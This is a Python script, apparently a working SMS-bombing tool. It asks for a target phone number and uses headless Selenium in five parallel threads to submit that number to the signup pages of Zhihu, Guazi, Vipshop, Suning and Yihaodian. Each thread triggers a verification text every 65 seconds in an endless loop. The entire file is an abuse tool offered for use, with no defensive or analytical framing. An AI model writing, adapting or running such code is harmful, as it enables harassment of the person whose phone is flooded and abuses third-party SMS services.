from selenium import webdriver
import time
from threading import Thread

class HongZha(object):
    def __init__(self):
        self.phone = input('请输入您要轰炸的号码：')
        self.num = 0
        self.opt = webdriver.ChromeOptions()
        self.opt.add_argument('headless')
    def send_yzm(self,button,name):
        button.click()
        self.num+=1
        print("{}   第{}次   发送成功   {}".format(self.phone,self.num,name))
        time.sleep(65) #两次发送的间隔必须在60秒以上。所以这边定义的是65秒

    def zhihu(self,name):
        while True:
            path = "C:/Users/Administrator/AppData/Local/Programs/Python/Python36/chromedriver.exe"
            # 把chrome设置成无界面模式，不论windows还是linux都可以，自动适配对应参数
            # 创建chrome无界面对象
            driver = webdriver.Chrome(chrome_options=self.opt)
            # 隐式等待，selenium自带的等待功能，比较智能，网速快会自动跳过
            driver.implicitly_wait(10)
            driver.get("https://www.zhihu.com/question/39993344")
            driver.find_element_by_xpath ( "//button[@class='Button Button--primary Button--blue']" ).click ()
            tel = driver.find_element_by_xpath("//input[@placeholder='手机号']")
            tel.send_keys(self.phone)
            button = driver.find_element_by_xpath ( "//button[@class='Button CountingDownButton SignFlow-smsInputButton Button--plain']" )
            self.send_yzm(button,name)
            driver.quit ()

    def guazi(self,name):
        while True:
            # driver = webdriver.Chrome(executable_path="C:/Users/Administrator/AppData/Local/Programs/Python/Python36/chromedriver.exe")
            driver = webdriver.Chrome(chrome_options=self.opt)
            driver.implicitly_wait(10)
            driver.get ( "https://www.guazi.com/www/bj/buy" )
            a_btn = driver.find_element_by_xpath ( "//a[@class='uc-my']" )
            a_btn.click ()
            tel = driver.find_element_by_xpath ( "//input[@placeholder='请输入您的手机号码']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ( "//button[@class='get-code']" )
            self.send_yzm ( button,name )
            driver.quit ()

    def wphui(self,name):
        while True:
            # driver = webdriver.Chrome(executable_path="C:/Users/Administrator/AppData/Local/Programs/Python/Python36/chromedriver.exe")
            driver = webdriver.Chrome(chrome_options=self.opt)
            driver.implicitly_wait(10)
            driver.get ( "https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F" )
            tel = driver.find_element_by_xpath ( "//input[@placeholder='请输入手机号码']" )
            tel.send_keys ( self.phone )
            driver.find_element_by_xpath ( "//input[@placeholder='请输入手机验证码']" ).click()
            button = driver.find_element_by_xpath (
                "//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']" )
            self.send_yzm ( button,name )
            driver.quit ()

    def suning(self,name):
        while True:
            # driver = webdriver.Chrome(executable_path="C:/Users/Administrator/AppData/Local/Programs/Python/Python36/chromedriver.exe")
            driver = webdriver.Chrome(chrome_options=self.opt)
            driver.implicitly_wait(10)
            driver.get ( "https://reg.suning.com/person.do" )
            tel = driver.find_element_by_xpath ( "//input[@id='mobileAlias']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath (
                "//a[@id='sendSmsCode']" )
            self.send_yzm ( button,name )
            driver.quit ()

    def yhd(self,name):
        while True:
            # driver = webdriver.Chrome(executable_path="C:/Users/Administrator/AppData/Local/Programs/Python/Python36/chromedriver.exe")
            driver = webdriver.Chrome(chrome_options=self.opt)
            driver.implicitly_wait(10)
            driver.get ( "https://passport.yhd.com/passport/register_input.do" )
            driver.find_element_by_xpath ( "//input[@id='userName']" ).send_keys("wujunya625")
            tel = driver.find_element_by_xpath ( "//input[@id='phone']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath (
                "//a[@class='receive_code fl same_code_btn r_disable_code ']" )
            button.click()
            self.send_yzm ( button,name )
            driver.quit ()

if __name__ == '__main__':
    hongzha = HongZha()
    zhihu = Thread(target=hongzha.zhihu,args=("知乎",))
    guazi = Thread ( target=hongzha.guazi,args=("瓜子",) )
    wphui = Thread(target=hongzha.wphui,args=("唯品会",))
    suning = Thread(target=hongzha.suning,args=("苏宁",))
    yhd    = Thread( target=hongzha.yhd,args=("一号店",) )

    zhihu.start()
    guazi.start()
    wphui.start()
    suning.start()
    yhd.start()

